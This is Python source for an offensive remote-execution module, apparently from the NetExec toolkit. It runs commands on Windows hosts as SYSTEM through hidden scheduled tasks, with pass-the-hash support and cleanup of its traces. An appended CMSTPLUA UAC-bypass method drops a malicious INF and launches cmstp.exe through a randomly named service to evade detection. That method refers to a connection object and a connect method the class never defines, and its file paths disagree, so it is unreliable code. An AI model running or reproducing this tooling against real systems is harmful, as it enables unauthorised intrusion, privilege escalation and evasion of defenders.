import os
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from nxc.helpers.misc import gen_random_string
from time import sleep
from datetime import datetime, timedelta
import random


class TSCH_EXEC:
    def __init__(self, target, share_name, username, password, domain, doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, logger=None, tries=None, share=None):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__share_name = share_name
        self.__lmhash = ""
        self.__nthash = ""
        self.__outputBuffer = b""
        self.__retOutput = False
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__remoteHost = remoteHost
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.__output_filename = None
        self.__share = share
        self.logger = logger

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = r"ncacn_np:%s[\pipe\atsvc]" % self.__target
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.setRemoteHost(self.__remoteHost)

        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

    def execute(self, command, output=False):
        self.__retOutput = output
        self.execute_handler(command)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    def get_end_boundary(self):
        # Get current date and time + 5 minutes
        end_boundary = datetime.now() + timedelta(minutes=5)

        # Format it to match the format in the XML: "YYYY-MM-DDTHH:MM:SS.ssssss"
        return end_boundary.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]

    def gen_xml(self, command, fileless=False):
        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <RegistrationTrigger>
      <EndBoundary>{self.get_end_boundary()}</EndBoundary>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
"""
        if self.__retOutput:
            self.__output_filename = "\\Windows\\Temp\\" + gen_random_string(6)
            if fileless:
                local_ip = self.__rpctransport.get_socket().getsockname()[0]
                argument_xml = f"      <Arguments>/C {command} &gt; \\\\{local_ip}\\{self.__share_name}\\{self.__output_filename} 2&gt;&amp;1</Arguments>"
            else:
                argument_xml = f"      <Arguments>/C {command} &gt; {self.__output_filename} 2&gt;&amp;1</Arguments>"

        elif self.__retOutput is False:
            argument_xml = f"      <Arguments>/C {command}</Arguments>"

        self.logger.debug("Generated argument XML: " + argument_xml)
        xml += argument_xml

        xml += """
    </Exec>
  </Actions>
</Task>
"""
        return xml

    def execute_handler(self, command, fileless=False):
        dce = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        dce.set_credentials(*self.__rpctransport.get_credentials())
        dce.connect()

        tmpName = gen_random_string(8)

        xml = self.gen_xml(command, fileless)

        self.logger.debug(f"Task XML: {xml}")
        self.logger.info(f"Creating task \\{tmpName}")
        try:
            # windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.bind(tsch.MSRPC_UUID_TSCHS)
            tsch.hSchRpcRegisterTask(dce, f"\\{tmpName}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        except Exception as e:
            if e.error_code and hex(e.error_code) == "0x80070005":
                self.logger.fail("ATEXEC: Create schedule task got blocked.")
            else:
                self.logger.fail(str(e))
            return

        done = False
        while not done:
            self.logger.debug(f"Calling SchRpcGetLastRunInfo for \\{tmpName}")
            resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{tmpName}")
            if resp["pLastRuntime"]["wYear"] != 0:
                done = True
            else:
                sleep(2)

        self.logger.info(f"Deleting task \\{tmpName}")
        tsch.hSchRpcDelete(dce, f"\\{tmpName}")

        if self.__retOutput:
            if fileless:
                while True:
                    try:
                        with open(os.path.join("/tmp", "nxc_hosted", self.__output_filename)) as output:
                            self.output_callback(output.read())
                        break
                    except OSError:
                        sleep(2)
            else:
                ":".join(map(str, self.__rpctransport.get_socket().getpeername()))
                smbConnection = self.__rpctransport.get_smb_connection()

                tries = 1
                # Give the command a bit of time to execute before we try to read the output, 0.4 seconds was good in testing
                sleep(0.4)
                while True:
                    try:
                        self.logger.info(f"Attempting to read {self.__share}\\{self.__output_filename}")
                        smbConnection.getFile(self.__share, self.__output_filename, self.output_callback)
                        break
                    except Exception as e:
                        if tries >= self.__tries:
                            self.logger.fail("ATEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
                            break
                        if "STATUS_BAD_NETWORK_NAME" in str(e):
                            self.logger.fail(f"ATEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                            break
                        elif "STATUS_VIRUS_INFECTED" in str(e):
                            self.logger.fail("Command did not run because a virus was detected")
                            break
                        # When executing powershell and the command is still running, we get a sharing violation
                        # We can use that information to wait longer than if the file is not found (probably av or something)
                        if "STATUS_SHARING_VIOLATION" in str(e):
                            self.logger.info(f"File {self.__share}\\{self.__output_filename} is still in use with {self.__tries - tries} tries left, retrying...")
                            tries += 1
                            sleep(1)
                        elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                            self.logger.info(f"File {self.__share}\\{self.__output_filename} not found with {self.__tries - tries} tries left, deducting 10 tries and retrying...")
                            tries += 10
                            sleep(1)
                        else:
                            self.logger.debug(f"Exception when trying to read output file: {e!s}. {self.__tries - tries} tries left, retrying...")
                            tries += 1
                            sleep(1)

                try:
                    self.logger.debug(f"Deleting file {self.__share}\\{self.__output_filename}")
                    smbConnection.deleteFile(self.__share, self.__output_filename)
                except Exception:
                    pass

        dce.disconnect()

    def __bypassuac_cmstplua(self, command):
        """
        Implements CMSTPLUA UAC bypass - exploits the fact that 
        cmstp.exe auto-elevates and we can use network paths to bypass UAC restrictions.
        This is a more direct bypass that uses cmstp.exe's COM object auto-elevation.
        """
        # Create random filenames to avoid detection
        output_file = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
        inf_file = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
        self.__output_filename = output_file
        
        # Use the main TSCH_EXEC SMB connection (self.conn)
        
        try:
            # Ensure the main SMB connection is established
            if not hasattr(self, 'conn') or not self.conn:
                self.logger.debug("Main SMB connection not found or initialized in __bypassuac_cmstplua, establishing...")
                # Assuming self.connect() initializes self.conn appropriately
                # If self.connect() isn't the right method, this needs adjustment
                # based on how TSCH_EXEC establishes its primary SMB connection.
                # For now, we rely on the structure where self.conn is expected
                # to be available after TSCH_EXEC initialization.
                # If direct initialization is needed, it might look like:
                # self.connect() # Re-evaluate if this truly sets self.conn
                # Or perhaps self.conn = self.__rpctransport.get_smb_connection() after __rpctransport.connect()
                # We need to ensure self.conn is a valid SMBConnection object here.
                # Adding a direct call to self.connect() as a safety measure.
                self.connect()

            # Create the INF file content for CMSTP
            # This will execute our command via a COM object method
            inf_content = f"""[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%SystemRoot%\\\\system32\\\\scrobj.dll,NI,{{00000000-0000-0000-0000-0000DEADBEEF}}

[{{00000000-0000-0000-0000-0000DEADBEEF}}]
2,"""
            
            # Prepare command with UNC path for output
            if self.__retOutput:
                cmd = f'cmd.exe /c "{command} > \\\\\\\\127.0.0.1\\\\{self.__share}\\\\{output_file} 2>&1"'
            else:
                cmd = f'cmd.exe /c "{command}"'
                
            # Add our command to the INF
            inf_content += f'"{cmd}"'
            
            # Write the INF file to the C$ share using self.conn
            self.logger.debug(f"Writing INF file to {self.__share}\\\\\\\\{inf_file}.inf")
            self.conn.putFile(self.__share, f"{inf_file}.inf", inf_content.encode())
            
            # Create a service to run CMSTP with our INF file
            scm_rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:%s[\\\\pipe\\\\svcctl]" % self.__target)
            if hasattr(scm_rpctransport, "set_credentials"):
                scm_rpctransport.set_credentials(
                    self.__username, self.__password, self.__domain,
                    self.__lmhash, self.__nthash, self.__aesKey
                )
                scm_rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
            
            scm_dce = scm_rpctransport.get_dce_rpc()
            if self.__doKerberos:
                scm_dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            
            scm_dce.connect()
            
            from impacket.dcerpc.v5 import svcctl
            scm_dce.bind(svcctl.MSRPC_UUID_SCMR)
            
            # Create a new service to launch CMSTP
            resp = svcctl.hROpenSCManagerW(scm_dce)
            sc_handle = resp['lpScHandle']
            
            # Random service name
            service_name = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
            
            # Create command to run CMSTP with our INF file using a UNC path
            cmstp_cmd = f'C:\\\\Windows\\\\System32\\\\cmstp.exe /s /au C:\\\\{inf_file}.inf'
            
            # Create service to run CMSTP
            resp = svcctl.hRCreateServiceW(
                scm_dce,
                sc_handle,
                service_name + '\\x00',
                service_name + '\\x00',
                lpBinaryPathName=cmstp_cmd + '\\x00',
                dwStartType=svcctl.SERVICE_DEMAND_START
            )
            
            service_handle = resp['lpServiceHandle']
            
            # Start the service to trigger CMSTP
            self.logger.debug(f"Starting service to execute CMSTP with our INF file")
            svcctl.hRStartServiceW(scm_dce, service_handle)
            
            # Wait for execution
            sleep(4)
            
            # Clean up service and INF file
            self.logger.debug("Cleaning up service and INF file")
            svcctl.hRDeleteService(scm_dce, service_handle)
            svcctl.hRCloseServiceHandle(scm_dce, service_handle)
            
            try:
                # Use self.conn to delete the file
                self.conn.deleteFile(self.__share, f"{inf_file}.inf")
            except Exception as e:
                self.logger.debug(f"Error deleting INF file: {e}")
            
            # If output was requested, get the file
            if self.__retOutput:
                # Wait for command execution
                sleep(2)
                
                self.__outputBuffer = b""
                
                # Try to get the output file using self.conn
                for attempt in range(self.__tries):
                    try:
                        self.logger.info(f"Attempting to read {self.__share}\\\\\\\\{output_file}")
                        self.conn.getFile(self.__share, output_file, self.output_callback)
                        break
                    except Exception as e:
                        if attempt == self.__tries - 1:
                            self.logger.debug(f"Failed to get output after {self.__tries} attempts: {e}")
                        else:
                            self.logger.debug(f"Error getting output (attempt {attempt+1}/{self.__tries}): {e}")
                            sleep(2)
                # Clean up the output file using self.conn
                try:
                    self.logger.debug(f"Deleting output file: {output_file}")
                    self.conn.deleteFile(self.__share, output_file)
                except Exception as e:
                    self.logger.debug(f"Error deleting output file: {e}")
            # Ensure connection is closed
            scm_dce.disconnect()
            
            return self.__outputBuffer
            
        except Exception as e:
            self.logger.debug(f"UAC bypass via CMSTPLUA failed: {str(e)}")
            # Re-raise to try the next method
            raise e
